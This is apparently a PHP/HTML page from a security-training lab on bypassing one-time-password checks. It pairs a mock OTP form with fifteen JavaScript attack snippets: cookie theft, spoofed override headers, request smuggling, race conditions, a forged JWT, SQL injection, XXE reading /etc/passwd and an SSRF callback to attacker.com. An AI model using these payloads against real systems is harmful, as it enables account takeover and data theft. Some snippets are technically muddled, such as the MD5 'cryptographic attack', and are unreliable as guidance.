<?php
// Lab 5: Advanced OTP Bypass
// Vulnerability: Advanced OTP bypass techniques

session_start();

$message = '';
$otp_sent = false;
$otp_verified = false;
$advanced_attempts = $_SESSION['advanced_attempts'] ?? 0;

// Simulate OTP generation and verification
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'send_otp') {
        $phone = $_POST['phone'] ?? '';
        $email = $_POST['email'] ?? '';
        
        if (!empty($phone) || !empty($email)) {
            // Generate a simple 6-digit OTP
            $otp = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
            $_SESSION['otp'] = $otp;
            $_SESSION['otp_time'] = time();
            $_SESSION['phone'] = $phone;
            $_SESSION['email'] = $email;
            $otp_sent = true;
            $message = '<div class="alert alert-success">✅ OTP sent successfully! Check your phone/email.</div>';
        } else {
            $message = '<div class="alert alert-danger">❌ Please provide phone number or email.</div>';
        }
    } elseif ($action === 'verify_otp') {
        $entered_otp = $_POST['otp'] ?? '';
        $stored_otp = $_SESSION['otp'] ?? '';
        
        if (!empty($entered_otp) && !empty($stored_otp)) {
            // Check if OTP is expired (5 minutes)
            if (time() - $_SESSION['otp_time'] > 300) {
                $message = '<div class="alert alert-danger">❌ OTP has expired. Please request a new one.</div>';
            } elseif ($entered_otp === $stored_otp) {
                $otp_verified = true;
                $message = '<div class="alert alert-success">✅ OTP verified successfully! Access granted.</div>';
            } else {
                $message = '<div class="alert alert-danger">❌ Invalid OTP. Please try again.</div>';
            }
        } else {
            $message = '<div class="alert alert-danger">❌ Please enter the OTP.</div>';
        }
    } elseif ($action === 'advanced_bypass') {
        $bypass_type = $_POST['bypass_type'] ?? '';
        $bypass_data = $_POST['bypass_data'] ?? '';
        
        if (!empty($bypass_type) && !empty($bypass_data)) {
            $_SESSION['advanced_attempts'] = $advanced_attempts + 1;
            $message = '<div class="alert alert-warning">⚠️ Advanced bypass attempt detected: ' . htmlspecialchars($bypass_type) . ' - ' . htmlspecialchars($bypass_data) . '</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: Advanced OTP Bypass - OTP Bypass Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .result-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .advanced-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }

        .vulnerable-form {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .otp-code {
            font-family: 'Courier New', monospace;
            font-size: 2rem;
            font-weight: bold;
            color: var(--accent-green);
            text-align: center;
            letter-spacing: 0.5rem;
        }

        .advanced-techniques {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1rem;
            margin: 1rem 0;
        }

        .technique-card {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            border: 1px solid #334155;
        }

        .technique-title {
            color: var(--accent-green);
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        .technique-demo {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 4px;
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }

        .advanced-simulator {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border: 1px solid #334155;
        }

        .advanced-attempts {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-red);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to OTP Bypass Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: Advanced OTP Bypass</h1>
            <p class="hero-subtitle">Advanced OTP bypass techniques</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates advanced OTP bypass vulnerabilities that combine multiple techniques like session hijacking, API manipulation, protocol attacks, and sophisticated social engineering to bypass OTP authentication.</p>
            <p><strong>Objective:</strong> Understand how advanced OTP bypass attacks work and how to exploit them.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable OTP System
                    </div>
                    <div class="card-body">
                        <div class="vulnerable-form">
                            <h5>Two-Factor Authentication</h5>
                            <p>This system uses OTP for two-factor authentication. Try to exploit advanced bypass techniques:</p>
                            
                            <?php if (!$otp_sent): ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="send_otp">
                                <div class="mb-3">
                                    <label for="phone" class="form-label">Phone Number</label>
                                    <input type="tel" class="form-control" id="phone" name="phone" placeholder="+1234567890">
                                </div>
                                <div class="mb-3">
                                    <label for="email" class="form-label">Email Address</label>
                                    <input type="email" class="form-control" id="email" name="email" placeholder="user@example.com">
                                </div>
                                <button type="submit" class="btn btn-primary">Send OTP</button>
                            </form>
                            <?php else: ?>
                            <form method="POST">
                                <input type="hidden" name="action" value="verify_otp">
                                <div class="mb-3">
                                    <label for="otp" class="form-label">Enter OTP</label>
                                    <input type="text" class="form-control" id="otp" name="otp" placeholder="123456" maxlength="6">
                                </div>
                                <button type="submit" class="btn btn-primary">Verify OTP</button>
                            </form>
                            <?php endif; ?>
                            
                            <?php echo $message; ?>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-gear me-2"></i>Advanced Bypass Simulator
                    </div>
                    <div class="card-body">
                        <div class="advanced-simulator">
                            <h5>Advanced Bypass Attack Simulator</h5>
                            <p>Simulate advanced bypass attacks:</p>
                            
                            <form method="POST">
                                <input type="hidden" name="action" value="advanced_bypass">
                                <div class="mb-3">
                                    <label for="bypass_type" class="form-label">Bypass Type</label>
                                    <select class="form-select" id="bypass_type" name="bypass_type">
                                        <option value="">Select bypass type</option>
                                        <option value="session_hijacking">Session Hijacking</option>
                                        <option value="api_manipulation">API Manipulation</option>
                                        <option value="protocol_attack">Protocol Attack</option>
                                        <option value="token_replay">Token Replay</option>
                                        <option value="race_condition">Race Condition</option>
                                        <option value="side_channel">Side Channel Attack</option>
                                        <option value="cryptographic_attack">Cryptographic Attack</option>
                                        <option value="multi_vector">Multi-Vector Attack</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label for="bypass_data" class="form-label">Bypass Data</label>
                                    <textarea class="form-control" id="bypass_data" name="bypass_data" rows="3" placeholder="Enter your advanced bypass data..."></textarea>
                                </div>
                                <button type="submit" class="btn btn-primary">Simulate Attack</button>
                            </form>
                        </div>
                        
                        <div class="advanced-attempts">
                            <h5>Advanced Bypass Attempts:</h5>
                            <p>Total attempts: <?php echo $advanced_attempts; ?></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <?php if ($otp_sent && !$otp_verified): ?>
        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>OTP Display (For Testing)
                    </div>
                    <div class="card-body">
                        <div class="otp-display">
                            <h5>Generated OTP (For Testing Only):</h5>
                            <div class="otp-code"><?php echo $_SESSION['otp'] ?? 'N/A'; ?></div>
                            <small class="text-muted">This OTP is displayed for testing purposes only. In real-world scenarios, this would be sent via SMS/email.</small>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php endif; ?>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Advanced Bypass Techniques
                    </div>
                    <div class="card-body">
                        <div class="advanced-techniques">
                            <div class="technique-card">
                                <div class="technique-title">Session Hijacking</div>
                                <div class="technique-demo">// Steal session token and bypass OTP
const sessionToken = document.cookie.match(/session_id=([^;]+)/)[1];
fetch('/verify_otp', {
    headers: {'Cookie': `session_id=${sessionToken}`}
});</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">API Manipulation</div>
                                <div class="technique-demo">// Manipulate API endpoints
fetch('/api/verify_otp', {
    method: 'POST',
    headers: {'X-Admin-Override': 'true'},
    body: JSON.stringify({otp: 'bypass'})
});</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Protocol Attack</div>
                                <div class="technique-demo">// Exploit protocol vulnerabilities
// HTTP/2 smuggling, request splitting
// WebSocket hijacking, etc.</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Token Replay</div>
                                <div class="technique-demo">// Replay valid OTP tokens
const validOTP = '123456';
// Use same OTP multiple times
// Exploit token reuse vulnerabilities</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Race Condition</div>
                                <div class="technique-demo">// Exploit race conditions
Promise.all([
    fetch('/verify_otp', {body: 'otp=123456'}),
    fetch('/verify_otp', {body: 'otp=123456'}),
    fetch('/verify_otp', {body: 'otp=123456'})
]);</div>
                            </div>
                            
                            <div class="technique-card">
                                <div class="technique-title">Side Channel Attack</div>
                                <div class="technique-demo">// Use side channel information
// Timing attacks, power analysis
// Electromagnetic emissions, etc.</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Advanced OTP Bypass</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> Multiple techniques</li>
                        <li><strong>Issue:</strong> Complex vulnerabilities</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Session Hijacking:</strong> Steal session tokens</li>
                        <li><strong>API Manipulation:</strong> Manipulate API endpoints</li>
                        <li><strong>Protocol Attack:</strong> Exploit protocol vulnerabilities</li>
                        <li><strong>Multi-Vector:</strong> Combine multiple techniques</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>Advanced OTP Bypass Examples</h5>
            <p>Use these techniques to exploit advanced OTP bypass vulnerabilities:</p>
            
            <h6>1. Session Hijacking Attack:</h6>
            <div class="code-block">// Steal session token and bypass OTP
const sessionToken = document.cookie.match(/session_id=([^;]+)/)[1];

// Use stolen session to bypass OTP
fetch('/verify_otp', {
    method: 'POST',
    headers: {
        'Cookie': `session_id=${sessionToken}`,
        'X-Requested-With': 'XMLHttpRequest'
    },
    body: JSON.stringify({otp: 'bypass'})
});</div>

            <h6>2. API Manipulation Attack:</h6>
            <div class="code-block">// Manipulate API endpoints
fetch('/api/verify_otp', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Admin-Override': 'true',
        'X-Bypass-OTP': '1',
        'X-Skip-Verification': 'yes'
    },
    body: JSON.stringify({
        otp: 'bypass',
        admin_override: true,
        skip_verification: true
    })
});</div>

            <h6>3. Protocol Attack (HTTP/2 Smuggling):</h6>
            <div class="code-block">// HTTP/2 request smuggling
const smuggledRequest = `POST /verify_otp HTTP/1.1
Host: vulnerable-site.com
Content-Length: 13
Transfer-Encoding: chunked

0

POST /admin/bypass_otp HTTP/1.1
Host: vulnerable-site.com
Content-Length: 15

otp=bypass`;

// Send smuggled request
fetch('/verify_otp', {
    method: 'POST',
    body: smuggledRequest
});</div>

            <h6>4. Token Replay Attack:</h6>
            <div class="code-block">// Replay valid OTP tokens
const validOTP = '123456';

// Use same OTP multiple times
for (let i = 0; i < 100; i++) {
    fetch('/verify_otp', {
        method: 'POST',
        body: JSON.stringify({otp: validOTP})
    });
}

// Or use OTP from different session
const otherSessionOTP = '654321';
fetch('/verify_otp', {
    method: 'POST',
    headers: {'Cookie': 'PHPSESSID=other_session_id'},
    body: JSON.stringify({otp: otherSessionOTP})
});</div>

            <h6>5. Race Condition Attack:</h6>
            <div class="code-block">// Exploit race conditions
const promises = [];

// Send multiple requests simultaneously
for (let i = 0; i < 10; i++) {
    promises.push(
        fetch('/verify_otp', {
            method: 'POST',
            body: JSON.stringify({otp: '123456'})
        })
    );
}

// Wait for all requests to complete
Promise.all(promises).then(responses => {
    responses.forEach(response => {
        if (response.ok) {
            console.log('OTP bypassed!');
        }
    });
});</div>

            <h6>6. Side Channel Attack:</h6>
            <div class="code-block">// Use side channel information
function measureResponseTime(otp) {
    const start = performance.now();
    
    return fetch('/verify_otp', {
        method: 'POST',
        body: JSON.stringify({otp: otp})
    }).then(response => {
        const end = performance.now();
        return {response, time: end - start};
    });
}

// Analyze timing patterns
const timingData = [];
for (let i = 0; i < 1000; i++) {
    const otp = i.toString().padStart(6, '0');
    measureResponseTime(otp).then(data => {
        timingData.push({otp, time: data.time});
    });
}</div>

            <h6>7. Cryptographic Attack:</h6>
            <div class="code-block">// Exploit weak cryptography
const crypto = require('crypto');

// Brute force weak OTP generation
function bruteForceOTP() {
    const startTime = Date.now();
    
    for (let i = 0; i < 1000000; i++) {
        const otp = i.toString().padStart(6, '0');
        const hash = crypto.createHash('md5').update(otp).digest('hex');
        
        // Check if hash matches known pattern
        if (hash.startsWith('0000')) {
            console.log(`Weak OTP found: ${otp}`);
            break;
        }
    }
}

bruteForceOTP();</div>

            <h6>8. Multi-Vector Attack:</h6>
            <div class="code-block">// Combine multiple techniques
async function multiVectorAttack() {
    // 1. Session hijacking
    const sessionToken = document.cookie.match(/session_id=([^;]+)/)[1];
    
    // 2. API manipulation
    const apiResponse = await fetch('/api/verify_otp', {
        method: 'POST',
        headers: {
            'Cookie': `session_id=${sessionToken}`,
            'X-Admin-Override': 'true',
            'X-Bypass-OTP': '1'
        },
        body: JSON.stringify({otp: 'bypass'})
    });
    
    // 3. Race condition
    const racePromises = [];
    for (let i = 0; i < 5; i++) {
        racePromises.push(
            fetch('/verify_otp', {
                method: 'POST',
                body: JSON.stringify({otp: '123456'})
            })
        );
    }
    
    // 4. Side channel analysis
    const timingData = await Promise.all(racePromises);
    
    return {apiResponse, timingData};
}

multiVectorAttack();</div>

            <h6>9. WebSocket Hijacking:</h6>
            <div class="code-block">// Hijack WebSocket connection
const ws = new WebSocket('ws://vulnerable-site.com/otp');

ws.onopen = function() {
    // Send malicious OTP verification
    ws.send(JSON.stringify({
        type: 'verify_otp',
        otp: 'bypass',
        admin_override: true
    }));
};

ws.onmessage = function(event) {
    const data = JSON.parse(event.data);
    if (data.success) {
        console.log('OTP bypassed via WebSocket!');
    }
};</div>

            <h6>10. GraphQL Attack:</h6>
            <div class="code-block">// Exploit GraphQL vulnerabilities
const query = `
mutation {
    verifyOTP(otp: "bypass", adminOverride: true) {
        success
        message
    }
}
`;

fetch('/graphql', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({query})
});</div>

            <h6>11. JWT Token Manipulation:</h6>
            <div class="code-block">// Manipulate JWT tokens
const jwt = require('jsonwebtoken');

// Create malicious JWT
const payload = {
    user_id: 123,
    otp_verified: true,
    admin: true,
    exp: Math.floor(Date.now() / 1000) + 3600
};

const token = jwt.sign(payload, 'secret', {algorithm: 'HS256'});

// Use malicious JWT
fetch('/verify_otp', {
    method: 'POST',
    headers: {'Authorization': `Bearer ${token}`},
    body: JSON.stringify({otp: 'bypass'})
});</div>

            <h6>12. SQL Injection via OTP:</h6>
            <div class="code-block">// SQL injection in OTP verification
const maliciousOTP = "123456'; UPDATE users SET otp_verified=1 WHERE id=1; --";

fetch('/verify_otp', {
    method: 'POST',
    body: JSON.stringify({otp: maliciousOTP})
});</div>

            <h6>13. XML External Entity Attack:</h6>
            <div class="code-block">// XXE attack via OTP
const maliciousXML = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE otp [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<otp>
    <code>&xxe;</code>
    <verified>true</verified>
</otp>`;

fetch('/verify_otp', {
    method: 'POST',
    headers: {'Content-Type': 'application/xml'},
    body: maliciousXML
});</div>

            <h6>14. Server-Side Request Forgery:</h6>
            <div class="code-block">// SSRF via OTP verification
const ssrfOTP = "http://localhost:8080/admin/bypass_otp";

fetch('/verify_otp', {
    method: 'POST',
    body: JSON.stringify({
        otp: ssrfOTP,
        callback_url: "http://attacker.com/capture"
    })
});</div>

            <h6>15. Advanced Social Engineering:</h6>
            <div class="code-block">// Combine technical and social engineering
// 1. Create fake support website
// 2. Send phishing emails
// 3. Use technical exploits
// 4. Manipulate user psychology

const attack = {
    technical: {
        session_hijacking: true,
        api_manipulation: true,
        race_condition: true
    },
    social: {
        fake_support: true,
        urgency_tactic: true,
        authority_impersonation: true
    }
};

// Execute multi-vector attack
executeAttack(attack);</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Sophisticated account takeover</li>
                <li>Advanced financial fraud</li>
                <li>Complex authentication bypass</li>
                <li>Critical security breaches</li>
                <li>Cross-site attacks and data exfiltration</li>
                <li>Advanced persistent threats</li>
                <li>Corporate espionage</li>
                <li>Nation-state attacks</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement comprehensive security controls</li>
                    <li>Use secure OTP generation and delivery</li>
                    <li>Implement proper session management</li>
                    <li>Use secure API design and implementation</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual authentication patterns</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use secure coding practices</li>
                    <li>Implement proper error handling</li>
                    <li>Educate users about security threats</li>
                    <li>Use multi-factor authentication</li>
                    <li>Implement proper logging and monitoring</li>
                    <li>Use security awareness programs</li>
                    <li>Implement proper incident response</li>
                    <li>Use threat intelligence and monitoring</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testAdvancedBypass() {
            alert('Advanced Bypass test initiated. Try the advanced bypass techniques above.');
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
